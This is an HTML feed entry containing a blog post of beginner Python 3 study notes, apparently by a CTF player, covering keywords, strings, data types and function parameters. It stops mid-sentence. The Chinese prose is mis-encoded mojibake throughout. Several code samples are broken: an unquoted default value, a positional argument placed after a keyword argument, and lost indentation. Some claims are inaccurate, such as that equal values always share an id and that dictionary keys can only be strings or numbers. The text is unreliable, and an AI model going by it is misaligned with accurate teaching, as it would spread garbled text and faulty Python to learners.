        <content type="html"><![CDATA[<h1 id="Python3å­¦ä¹ ç¬”è®°"><a href="#Python3å­¦ä¹ ç¬”è®°" class="headerlink" title="Python3å­¦ä¹ ç¬”è®°"></a>Python3å­¦ä¹ ç¬”è®°</h1><blockquote><p><strong>å†™åœ¨å‰é¢</strong></p><p><strong>æœ€è¿‘æ‰“CTFå·²ç»é‡åˆ°ç“¶é¢ˆäº†ï¼Œç®€å•çš„ã€è€ƒç‚¹æ¯”è¾ƒå•ä¸€çš„é¢˜èƒ½æ‰“ï¼Œä½†æ˜¯æ¯”èµ›ç°åœ¨çš„webé¢˜éƒ½æ˜¯ç»¼åˆæ€§æ¯”è¾ƒå¥½çš„ï¼Œè‡ªå·±å†™è„šæœ¬çš„æ°´å¹³ä¹Ÿæ˜¯ä¸å¤ªè¡Œï¼Œæ‰€ä»¥å‡†å¤‡æ‰“ä¸€ä¸‹Pythonçš„åŸºç¡€ï¼Œä¹‹åå¼€å§‹å¤ç°é‚£äº›é«˜æ°´å¹³çš„webé¢˜</strong></p></blockquote><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><ul><li>è§£é‡Šå‹è¯­è¨€ï¼šå¼€å‘è¿‡ç¨‹æ²¡æœ‰ç¼–è¯‘ç¯èŠ‚ï¼Œç±»ä¼¼çš„æœ‰PHPã€Perl</li><li>äº¤äº’å¼è¯­è¨€ï¼šåœ¨å‘½ä»¤è¡Œã€ç»ˆç«¯ä¸­ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªPythonæç¤ºç¬¦<code>&gt;&gt;&gt;</code>åç›´æ¥æ‰§è¡Œä»£ç </li><li>é¢å‘å¯¹è±¡è¯­è¨€ï¼šPythonæ”¯æŒé¢å‘å¯¹è±¡çš„é£æ ¼æˆ–ä»£ç å°è£…åœ¨å¯¹è±¡çš„ç¼–ç¨‹æŠ€æœ¯</li></ul><h2 id="å¼€å‘ç¯å¢ƒ"><a href="#å¼€å‘ç¯å¢ƒ" class="headerlink" title="å¼€å‘ç¯å¢ƒ"></a>å¼€å‘ç¯å¢ƒ</h2><blockquote><p>é€‰æ‹©çš„é›†æˆå¼€å‘ç¯å¢ƒï¼š<strong>PyCharm</strong></p></blockquote><h2 id="åŸºç¡€è¯­æ³•"><a href="#åŸºç¡€è¯­æ³•" class="headerlink" title="åŸºç¡€è¯­æ³•"></a>åŸºç¡€è¯­æ³•</h2><h3 id="æ ‡è¯†ç¬¦"><a href="#æ ‡è¯†ç¬¦" class="headerlink" title="æ ‡è¯†ç¬¦"></a>æ ‡è¯†ç¬¦</h3><ul><li>ç¬¬ä¸€ä¸ªå­—ç¬¦å¿…é¡»æ˜¯å­—æ¯è¡¨ä¸­çš„å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿<code>_</code></li><li>å…¶ä»–éƒ¨åˆ†å¯ä»¥æ˜¯å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€ä¸­æ–‡</li><li>æ ‡è¯†ç¬¦å¯¹å¤§å°å†™æ•æ„Ÿ</li></ul><h3 id="ä¿ç•™å­—"><a href="#ä¿ç•™å­—" class="headerlink" title="ä¿ç•™å­—"></a>ä¿ç•™å­—</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ ‡å‡†åº“é‡Œé¢æœ‰ä¸€ä¸ªkeywordæ¨¡å—ï¼Œå¯ä»¥æŸ¥çœ‹å½“å‰ç‰ˆæœ¬æ‰€æœ‰å…³é”®å­—</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> keyword</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>keyword.kwlist</span><br><span class="line">[<span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;as&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;async&#x27;</span>, <span class="string">&#x27;await&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;continue&#x27;</span>, <span class="string">&#x27;def&#x27;</span>, <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;elif&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;finally&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;is&#x27;</span>, <span class="string">&#x27;lambda&#x27;</span>, <span class="string">&#x27;nonlocal&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>, <span class="string">&#x27;return&#x27;</span>, <span class="string">&#x27;try&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;yield&#x27;</span>]</span><br><span class="line"><span class="comment"># Python3.7</span></span><br></pre></td></tr></table></figure><h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pythonä¸­å•è¡Œæ³¨é‡Šä»¥#å¼€å¤´</span></span><br><span class="line"><span class="comment"># ç¬¬ä¸€ä¸ªæ³¨é‡Š</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Hello, Python!&quot;</span>) <span class="comment"># ç¬¬äºŒä¸ªæ³¨é‡Š</span></span><br></pre></td></tr></table></figure><h3 id="è¡Œä¸ç¼©è¿›"><a href="#è¡Œä¸ç¼©è¿›" class="headerlink" title="è¡Œä¸ç¼©è¿›"></a>è¡Œä¸ç¼©è¿›</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pythonä»¥ç¼©è¿›æ¥è¡¨ç¤ºä»£ç å—ï¼Œä¸ç”¨&#123;&#125;,åŒä¸€ä¸ªä»£ç å—çš„è¯­å¥å¿…é¡»åŒ…å«ç›¸åŒçš„ç¼©è¿›ç©ºæ ¼æ•°</span></span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;True&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;False&quot;</span>)</span><br><span class="line"><span class="comment"># Pythonä¸€èˆ¬æ˜¯ä¸€è¡Œå†™å®Œä¸€æ¡è¯­å¥ï¼Œå¯ä»¥ç”¨åæ–œæ \æ¥å®ç°å¤šè¡Œè¯­å¥</span></span><br><span class="line">total = item_one + \</span><br><span class="line">item_two + \</span><br><span class="line">    item_three</span><br><span class="line"><span class="comment"># åœ¨[]ã€&#123;&#125;ã€()çš„å¤šè¡Œè¯­å¥ä¸­ï¼Œä¸ç”¨åæ–œæ \</span></span><br><span class="line">total = [<span class="string">&#x27;item_one&#x27;</span>, <span class="string">&#x27;item_two&#x27;</span>, <span class="string">&#x27;item_three&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;item_four&#x27;</span>, <span class="string">&#x27;item_five&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="æ•°å­—ç±»å‹"><a href="#æ•°å­—ç±»å‹" class="headerlink" title="æ•°å­—ç±»å‹"></a>æ•°å­—ç±»å‹</h3><p>æœ‰æ•´æ•°ã€å¸ƒå°”ã€æµ®ç‚¹æ•°å’Œå¤æ•°</p><ul><li><code>int</code>ï¼šå¦‚1ï¼Œ<strong>åªæœ‰é•¿æ•´å‹</strong></li><li><code>bool</code>ï¼šTrueæˆ–è€…False</li><li><code>float</code>ï¼š1.23ã€3E-2</li><li><code>complex</code>ï¼š1+2jã€1.1+2.2j</li></ul><h3 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h3><ul><li><p>å•å¼•å·å’ŒåŒå¼•å·ä¸€æ ·</p></li><li><p>è½¬ä¹‰å­—ç¬¦<code>\</code></p></li><li><p>å­—ç¬¦ä¸²å¯ä»¥ç”¨<code>+</code>è¿æ¥ï¼Œç”¨<code>*</code>é‡å¤</p></li><li><p>Pythonä¸­çš„å­—ç¬¦ä¸²ä¸èƒ½æ”¹å˜ï¼Œä¸”æ²¡æœ‰å•ç‹¬çš„å­—ç¬¦è¯´æ³•ï¼Œä¸€ä¸ªå­—ç¬¦å°±æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º 1 çš„å­—ç¬¦ä¸²</p></li><li><p>å­—ç¬¦ä¸²æˆªå–è¯­æ³•ï¼š&#x3D;&#x3D;å˜é‡[å¤´ä¸‹æ ‡:å°¾ä¸‹æ ‡:æ­¥é•¿]&#x3D;&#x3D;</p></li><li><p>Pythonçš„å­—ç¬¦ä¸²æ˜¯å·¦åŒ…å«çš„ï¼Œä»å·¦å¾€å³ä»¥ 0 å¼€å§‹ï¼Œä»å³å¾€å·¦ä»¥ -1 å¼€å§‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;C1everF0x&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment"># ç»“æœæ˜¯ C1everF0x</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">2</span>:<span class="number">5</span>])</span><br><span class="line"><span class="comment"># ç»“æœæ˜¯ eve</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># ç»“æœæ˜¯ C1everF0</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="ç©ºè¡Œ"><a href="#ç©ºè¡Œ" class="headerlink" title="ç©ºè¡Œ"></a>ç©ºè¡Œ</h3><ul><li>å‡½æ•°ä¹‹é—´ã€ç±»çš„æ–¹æ³•ä¹‹é—´ç”¨ç©ºè¡Œåˆ†éš”ï¼Œè¡¨ç¤ºä¸€æ®µæ–°çš„ä»£ç å¼€å§‹ï¼Œæ–¹ä¾¿ä»¥åä»£ç çš„ç»´æŠ¤å’Œé‡æ„</li></ul><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><ul><li><code>print</code>è¾“å‡ºé»˜è®¤æ¢è¡Œï¼Œä¸æ¢è¡Œè¦åœ¨å˜é‡æœ«å°¾åŠ ä¸Š <code>end=â€œ â€</code></li></ul><h3 id="importå’Œfromâ€¦import"><a href="#importå’Œfromâ€¦import" class="headerlink" title="importå’Œfromâ€¦import"></a>importå’Œfromâ€¦import</h3><ul><li>ç”¨äºå¯¼å…¥ç›¸åº”æ¨¡å—</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> somemodule<span class="comment"># å¯¼å…¥æ•´ä¸ªæ¨¡å—ï¼Œå¼•ç”¨æ—¶æ ¼å¼ä¸ºï¼šsomemodudle.somefunction()</span></span><br><span class="line"><span class="keyword">from</span> somemodule <span class="keyword">import</span> somefunction<span class="comment"># ä»æŸä¸ªæ¨¡å—ä¸­å¯¼å…¥ä¸€äº›å‡½æ•°ï¼Œå¼•ç”¨æ—¶æ ¼å¼ä¸ºï¼šsomefunction()</span></span><br><span class="line"><span class="keyword">from</span> somemodule <span class="keyword">import</span> *<span class="comment"># å¯¼å…¥æŸä¸ªæ¨¡å—å…¨éƒ¨å‡½æ•°ï¼Œå¼•ç”¨æ—¶æ ¼å¼ä¸ºï¼šsomefunction()</span></span><br><span class="line"><span class="keyword">import</span> somemodule <span class="keyword">as</span> abc<span class="comment"># ä½œç”¨æ˜¯è‡ªå®šä¹‰æ¨¡å—åå­—ï¼Œåœ¨å¼•ç”¨æ—¶æ ¼å¼ä¸ºï¼šabc.somefunction()</span></span><br></pre></td></tr></table></figure><h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><blockquote><p><strong>å…¶å®è¿™å…­ä¸ªæ•°æ®ç±»å‹ï¼Œå…¶å®éƒ½æ˜¯Pythonå®šä¹‰çš„å†…å»ºç±»ï¼Œæ¯ä¸€ä¸ªå˜é‡ï¼ˆå¯¹è±¡ï¼‰å…¶å®å°±æ˜¯ç±»çš„å®ä¾‹åŒ–</strong></p><p><strong>å³ï¼Œæ‰€æœ‰çš„å­—ç¬¦ä¸²éƒ½æ˜¯<code>str</code>ç±»çš„å®ä¾‹ï¼Œæ‰€æœ‰çš„åˆ—è¡¨éƒ½æ˜¯<code>list</code>ç±»çš„å®ä¾‹</strong></p></blockquote><table><thead><tr><th>ä¸å¯å˜</th><th>å¯å˜</th></tr></thead><tbody><tr><td>Number</td><td>List</td></tr><tr><td>String</td><td>Dictionary</td></tr><tr><td>Tupleï¼ˆå…ƒç»„ï¼‰</td><td>Setï¼ˆé›†åˆï¼‰</td></tr></tbody></table><h4 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h4><ul><li><p><code>int</code> <code>float</code> <code>bool</code> <code>complex</code> å››ç§ç±»å‹ï¼Œå…¶ä¸­<code>int</code>åªæœ‰é•¿æ•´å‹</p></li><li><p>åŠ å‡ä¹˜é™¤æ­£å¸¸ç”¨ï¼Œ<code>/</code>è¿”å›æµ®ç‚¹æ•°ï¼Œ<code>//</code>è¿”å›æ•´æ•°</p></li><li><p>æ•°å­—ç±»å‹å€¼ä¸å¯å˜çš„åŸå› å°±æ˜¯ï¼Œåªè¦ä¸¤ä¸ªå˜é‡çš„å€¼ç›¸åŒï¼Œé‚£ä¹ˆä»–ä»¬çš„&#x3D;&#x3D;ID(åœ°å€)&#x3D;&#x3D;å°±æ˜¯ç›¸åŒçš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">5</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">5</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(a)  </span><br><span class="line"><span class="number">162334512</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(b)  </span><br><span class="line"><span class="number">162334512</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b  </span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="Stringï¼ˆä¸Šé¢å­—ç¬¦ä¸²ï¼‰"><a href="#Stringï¼ˆä¸Šé¢å­—ç¬¦ä¸²ï¼‰" class="headerlink" title="Stringï¼ˆä¸Šé¢å­—ç¬¦ä¸²ï¼‰"></a>Stringï¼ˆä¸Šé¢å­—ç¬¦ä¸²ï¼‰</h4><h4 id="Tupleï¼ˆå…ƒç»„ï¼‰"><a href="#Tupleï¼ˆå…ƒç»„ï¼‰" class="headerlink" title="Tupleï¼ˆå…ƒç»„ï¼‰"></a>Tupleï¼ˆå…ƒç»„ï¼‰</h4><ul><li><p>ç”¨<code>()</code>è¡¨ç¤ºï¼Œæ¯”å¦‚<code>(&#39;abcd&#39;, 786, 2.23, &#39;C1everF0x&#39;, 70.2)</code>å°±æ˜¯ä¸€ä¸ªå…ƒç»„</p></li><li><p>æˆªå–ã€ç´¢å¼•å’Œåˆ‡ç‰‡æ–¹æ³•å’Œå­—ç¬¦ä¸²ä¸€æ ·</p></li><li><p>æ„é€ åŒ…å« 0 ä¸ªæˆ– 1 ä¸ªå…ƒç´ çš„å…ƒç»„è¯­æ³•è§„åˆ™æ¯”è¾ƒç‰¹æ®Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tup1 = ()<span class="comment"># ç©ºå…ƒç»„</span></span><br><span class="line">tup2 = (<span class="number">20</span>,)<span class="comment"># å«ä¸€ä¸ªå…ƒç´ çš„ï¼Œéœ€è¦åœ¨å…ƒç´ åé¢æ·»åŠ é€—å·</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="Listï¼ˆåˆ—è¡¨ï¼‰"><a href="#Listï¼ˆåˆ—è¡¨ï¼‰" class="headerlink" title="Listï¼ˆåˆ—è¡¨ï¼‰"></a>Listï¼ˆåˆ—è¡¨ï¼‰</h4><ul><li>ç”¨<code>[]</code>è¡¨ç¤ºï¼Œæ¯”å¦‚<code>[ &#39;abcd&#39;, 786 , 2.23, &#39;C1everF0x&#39;, 70.2 ]</code>å°±æ˜¯ä¸€ä¸ªåˆ—è¡¨</li><li>æˆªå–ã€ç´¢å¼•å’Œåˆ‡ç‰‡æ–¹æ³•å’Œå­—ç¬¦ä¸²ä¸€æ ·</li></ul><h4 id="Setï¼ˆé›†åˆï¼‰"><a href="#Setï¼ˆé›†åˆï¼‰" class="headerlink" title="Setï¼ˆé›†åˆï¼‰"></a>Setï¼ˆé›†åˆï¼‰</h4><ul><li>ç”¨<code>&#123;&#125;</code>æˆ–è€…<code>set()</code>åˆ›å»ºé›†åˆï¼Œç©ºé›†å¿…é¡»ç”¨<code>set()</code>ï¼Œå› ä¸º<code>&#123;&#125;</code>æ˜¯ç”¨æ¥åˆ›å»ºç©ºå­—å…¸</li></ul><h4 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h4><ul><li><p>å­—å…¸åŒ…å«åœ¨<code>&#123;&#125;</code>ä¸­ï¼Œæ¯ä¸ªé”®å€¼<code>key=&gt;value</code> å¯¹ç”¨å†’å·<code>:</code> åˆ†å‰²ï¼Œæ¯ä¸ªå¯¹ä¹‹é—´ç”¨é€—å·åˆ†å‰²</p></li><li><p>é”®å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œå€¼ä¸æ˜¯å”¯ä¸€çš„</p></li><li><p>é”®çš„æ•°æ®ç±»å‹åªèƒ½æ˜¯å­—ç¬¦ä¸²æˆ–æ•°å­—ï¼Œå€¼å¯ä»¥æ˜¯ä»»ä½•æ•°æ®ç±»å‹</p></li></ul><h3 id="åŸºç¡€è¯­æ³•-1"><a href="#åŸºç¡€è¯­æ³•-1" class="headerlink" title="åŸºç¡€è¯­æ³•"></a>åŸºç¡€è¯­æ³•</h3><ul><li>è·ŸCè¯­è¨€å·®ä¸å¤šï¼Œä¸è®°ä¸Šæ¥äº†</li></ul><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><ul><li><p>è‡ªå®šä¹‰å‡½æ•°ä»¥<code>def</code>å¼€å¤´ï¼Œæ¥å‡½æ•°åï¼Œæ¥<code>(å‚æ•°åˆ—è¡¨)</code>ï¼Œæ¥<code>:</code></p></li><li><p><code>return [è¡¨è¾¾å¼]</code>è¡¨ç¤ºç»“æŸå‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªä¸œè¥¿ï¼Œå¦‚æœæ²¡æœ‰åˆ™æ˜¯è¿”å›<code>None</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">å‡½æ•°å</span> (å‚æ•°åˆ—è¡¨):</span><br><span class="line">å‡½æ•°ä»£ç </span><br></pre></td></tr></table></figure></li></ul><blockquote><p>å­¦åˆ°è¿™é‡Œçš„æ—¶å€™å‘ç°æœ‰ä¸€ä¸ªæ¦‚å¿µ</p><p>Pythoné‡Œé¢å˜é‡æ˜¯æ²¡æœ‰ç±»å‹çš„ï¼Œç±»å‹æ˜¯å±äºå¯¹è±¡ï¼Œå…¶ä¸­å°±æœ‰<strong>å¯æ›´æ”¹å¯¹è±¡</strong>å’Œ<strong>ä¸å¯æ›´æ”¹å¯¹è±¡</strong></p><ul><li>ä¸å¯å˜å¯¹è±¡ï¼šæ•°å­—ã€å­—ç¬¦ä¸²ã€å…ƒç»„</li><li>å¯å˜å¯¹è±¡ï¼šåˆ—è¡¨ã€é›†åˆã€å­—å…¸</li></ul><p><strong>æœ¬è´¨åŒºåˆ«</strong></p><p>å½“ç»™ä¸å¯å˜å¯¹è±¡é‡æ–°ä¼ å€¼çš„æ—¶å€™ï¼Œä¸æ˜¯ä¿®æ”¹äº†å˜é‡çš„å€¼ï¼Œè€Œæ˜¯é‡æ–°ç”Ÿæˆäº†ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œç„¶åå†è®©å˜é‡æŒ‡å‘æ–°çš„å†…å­˜åœ°å€ï¼Œ&#x3D;&#x3D;å…¶å†…å­˜åœ°å€å‘ç”Ÿäº†æ”¹å˜&#x3D;&#x3D;</p><p>å½“ç»™å¯å˜å¯¹è±¡é‡æ–°ä¼ å€¼çš„æ—¶å€™ï¼Œæ˜¯çœŸæ­£ä¿®æ”¹äº†å¯¹è±¡çš„å€¼ï¼Œæ²¡æœ‰é‡æ–°ç”Ÿæˆä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œå˜é‡å‰åæŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªå†…å­˜åœ°å€ï¼Œ&#x3D;&#x3D;å…¶å†…å­˜åœ°å€æ²¡æœ‰å‘ç”Ÿæ”¹å˜&#x3D;&#x3D;</p></blockquote><h4 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h4><h5 id="å¿…é¡»å‚æ•°"><a href="#å¿…é¡»å‚æ•°" class="headerlink" title="å¿…é¡»å‚æ•°"></a>å¿…é¡»å‚æ•°</h5><ul><li>é¡ºåºè¦å¯¹ï¼Œè°ƒç”¨æ•°é‡è¦å¯¹ï¼Œæ•°æ®ç±»å‹ä¹Ÿè¦å¯¹</li></ul><h5 id="å…³é”®å­—å‚æ•°"><a href="#å…³é”®å­—å‚æ•°" class="headerlink" title="å…³é”®å­—å‚æ•°"></a>å…³é”®å­—å‚æ•°</h5><ul><li><p>åœ¨è°ƒç”¨æ—¶ï¼Œå…è®¸å‚æ•°é¡ºåºå’Œå‡½æ•°å£°æ˜çš„æ—¶å€™ä¸ä¸€æ ·ï¼Œè§£é‡Šå™¨èƒ½å¤Ÿè‡ªåŠ¨åŒ¹é…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printsomething</span>(<span class="params"> name, age </span>):</span><br><span class="line"><span class="comment"># æ‰“å°ä»»ä½•ä¼ å…¥çš„å­—ç¬¦ä¸²</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;åå­—: &quot;</span>, name)</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;å¹´é¾„: &quot;</span>, age)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#è°ƒç”¨printsomethingå‡½æ•°</span></span><br><span class="line">printsomething( age=<span class="number">19</span>, name=<span class="string">&quot;C1everF0x&quot;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»“æœ</span></span><br><span class="line"><span class="comment"># åå­—:  C1everF0x</span></span><br><span class="line"><span class="comment"># å¹´é¾„:  19</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="é»˜è®¤å‚æ•°"><a href="#é»˜è®¤å‚æ•°" class="headerlink" title="é»˜è®¤å‚æ•°"></a>é»˜è®¤å‚æ•°</h5><ul><li><p>ä½¿ç”¨å‡½æ•°ä¼ å‚çš„æ—¶å€™æ²¡æœ‰ä¼ å…·ä½“å€¼è¿›å»ï¼Œå°±ä¼šä½¿ç”¨é»˜è®¤å€¼ï¼Œå³å‡½æ•°å£°æ˜æ—¶å‚æ•°åˆ—è¡¨é‡Œé¢å·²ç»è®¾ç½®å¥½çš„é‚£ä¸ªå€¼</p></li><li><p>é»˜è®¤å‚æ•°å¿…é¡»æ”¾åœ¨æœ€åï¼Œä¸ç„¶æŠ¥é”™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printsomething</span>(<span class="params"> age, <span class="built_in">id</span> = C1everF0x </span>):</span><br><span class="line"><span class="comment"># æ‰“å°å‡½æ•°ï¼Œå¹´é¾„å’Œid</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;å¹´é¾„ï¼š&quot;</span>, age)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;idï¼š&quot;</span>, <span class="built_in">id</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨printsomethingå‡½æ•°</span></span><br><span class="line">printsomething( age=<span class="number">19</span>, <span class="built_in">id</span>=<span class="string">&quot;Oui0jr&quot;</span>)</span><br><span class="line"><span class="comment"># ç»“æœæ˜¯ï¼š</span></span><br><span class="line"><span class="comment"># å¹´é¾„ï¼š19</span></span><br><span class="line"><span class="comment"># idï¼šOui0jr</span></span><br><span class="line">printsomething( age=<span class="number">19</span>, <span class="built_in">id</span>)</span><br><span class="line"><span class="comment"># ç»“æœæ˜¯ï¼š</span></span><br><span class="line"><span class="comment"># å¹´é¾„ï¼š19</span></span><br><span class="line"><span class="comment"># idï¼šC1everF0x</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="ä¸å®šé•¿å‚æ•°"><a href="#ä¸å®šé•¿å‚æ•°" class="headerlink" title="ä¸å®šé•¿å‚æ•°"></a>ä¸å®šé•¿å‚æ•°</h5><ul><li><p>å½“ä½ ä¸çŸ¥é“ä½ è¦ä¼ å¤šå°‘ã€ä¼ ä»€ä¹ˆç±»å‹çš„å‚æ•°è¿›å»çš„æ—¶å€™å¯ä»¥é‡‡ç”¨ï¼Œä»¥å­˜æ”¾æ‰€æœ‰æœªå‘½åçš„å‚æ•°</p></li><li><p>åŠ äº†æ˜Ÿå·<code>*</code>çš„å‚æ•°æ˜¯ä»¥å…ƒç»„å½¢å¼å¯¼å…¥</p><p>è¯­æ³•ä¸ºï¼šdef å‡½æ•°å([å¸¸è§„å‚æ•°], *vartuple):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printsomething</span>(<span class="params"> <span class="built_in">id</span>=C1everF0x, *vartuple </span>):</span><br><span class="line"><span class="comment"># æ‰“å°å‡½æ•°ï¼Œidã€å¹´é¾„å’Œæ°´å¹³</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;è¾“å‡ºï¼š&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">id</span>)</span><br><span class="line"><span class="built_in">print</span> (vartuple)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># è°ƒç”¨printsomethingå‡½æ•°</span></span><br><span class="line">printsomething( <span class="built_in">id</span>, <span class="number">19</span>, <span class="string">&quot;å¼Ÿå¼Ÿ&quot;</span>)</span><br><span class="line"><span class="comment"># ç»“æœæ˜¯</span></span><br><span class="line"><span class="comment"># è¾“å‡ºï¼š</span></span><br><span class="line"><span class="comment"># C1everF0x</span></span><br><span class="line"><span class="comment"># (19,&quot;å¼Ÿå¼Ÿ&quot;)</span></span><br></pre></td></tr></table></figure></li><li><p>åŠ äº†ä¸¤ä¸ªæ˜Ÿå·<code>**</code>çš„å‚æ•°æ˜¯ä»¥å­—å…¸å½¢å¼å¯¼å…¥</p><p>è¯­æ³•ä¸ºï¼šdef 